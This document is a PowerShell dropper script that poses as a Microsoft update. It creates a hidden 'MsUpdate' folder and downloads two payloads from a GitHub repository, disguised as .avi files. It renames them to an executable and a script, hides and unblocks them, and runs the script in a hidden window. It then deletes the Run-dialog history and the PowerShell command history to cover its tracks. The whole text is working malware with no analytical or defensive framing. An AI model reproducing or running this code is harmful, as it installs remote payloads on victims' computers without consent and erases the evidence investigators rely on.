## Create directory
$ErrorActionPreference = 'SilentlyContinue'
$UserProfile = [System.Environment]::GetFolderPath("UserProfile")
$MsRdpNetPath = Join-Path $UserProfile "AppData\Local\Microsoft\MsUpdate"
if (-not (Test-Path -Path $MsRdpNetPath)) {
    $MsRdpNetFolder = New-Item -Path $MsRdpNetPath -ItemType Directory -Force
    $MsRdpNetFolder.Attributes += "Hidden"
}

# Copy Agent
$rutaLocalAgent = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\RegUpdate.exe"
$urlRemotoAgent = "https://github.com/emakedie/UCN/raw/refs/heads/main/RegUpdate.avi"
if (-not (Test-Path $rutaLocalAgent)) {
    Invoke-WebRequest -Uri $urlRemotoAgent -OutFile $rutaLocalAgent
}
if ((Get-Item $rutaLocalAgent).Name -ne "RegUpdate.exe") {
    $rutaNuevoNombreAgent = $rutaLocalAgent -replace 'RegUpdate.avi', 'RegUpdate.exe'
    Rename-Item -Path $rutaLocalAgent -NewName $rutaNuevoNombreAgent
}
$atributosOcultosAgent = (Get-Item $rutaLocalAgent).Attributes -bor [System.IO.FileAttributes]::Hidden
Set-ItemProperty -Path $rutaLocalAgent -Name Attributes -Value $atributosOcultosAgent
Unblock-File -Path $rutaLocalAgent

# Copy Ejecuter
$rutaLocalEjecuter = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\SMSUCN.ps1"
$urlRemotoEjecuter = "https://github.com/emakedie/UCN/raw/refs/heads/main/SMSUCN.avi"
if (-not (Test-Path $rutaLocalEjecuter)) {
    Invoke-WebRequest -Uri $urlRemotoEjecuter -OutFile $rutaLocalEjecuter
}
if ((Get-Item $rutaLocalEjecuter).Name -ne "SMSUCN.ps1") {
    $rutaNuevoNombreEjecuter = $rutaLocalEjecuter -replace 'SMSUCN.avi', 'SMSUCN.ps1'
    Rename-Item -Path $rutaLocalEjecuter -NewName $rutaNuevoNombreEjecuter
}
$atributosOcultosEjecuter = (Get-Item $rutaLocalEjecuter).Attributes -bor [System.IO.FileAttributes]::Hidden
Set-ItemProperty -Path $rutaLocalEjecuter -Name Attributes -Value $atributosOcultosEjecuter
Unblock-File -Path $rutaLocalEjecuter


# Limpiar historial de ejecucion
$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
Remove-Item -LiteralPath $registryPath -Force


## Execution of the client
Start-Process -FilePath "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\SMSUCN.ps1" -ArgumentList "start" -WindowStyle Hidden


# Limpiar historial Powershell
Clear-History
Remove-Item $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
exit
